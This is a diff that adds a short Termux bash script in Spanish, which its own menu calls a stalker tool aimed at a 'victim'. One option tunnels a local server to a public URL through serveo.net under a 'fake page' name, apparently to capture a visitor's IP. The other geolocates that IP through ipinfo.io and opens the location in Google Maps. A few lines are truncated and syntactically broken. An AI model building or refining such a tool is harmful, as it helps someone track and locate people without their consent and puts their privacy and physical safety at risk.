@@ -1,0 +1,28 @@
+#!/bin/bash
+pkg install apt && apt install curl termux-api openssh
+clear
+while :
+do
+echo "1.conseguir ip publica de victima"
+echo "2.ver ubicacion"
+echo "3.salir"
+echo
+echo "elige una opcion: "
+read op
+case $op in
+1)clear && echo "escribe nombre de pagina falsa: "
+read n;
+ssh -R  $n:80:localhost:3000 serveo.net ;;
+
+2)echo "escribe ip publica de la victima: "
+read ip;
+loca=$(curl ipinfo.io/$ip/loc) && clear
+echo "la ubicacion es $loca"
+echo "abriendo mapa..."
+termux-open-url https://maps.google.com/?q=$loca && clear;>
+
+3)clear && echo "gracias x usar mi app acosador de mrd" &&>
+
+exit 1;;
+esac
+done
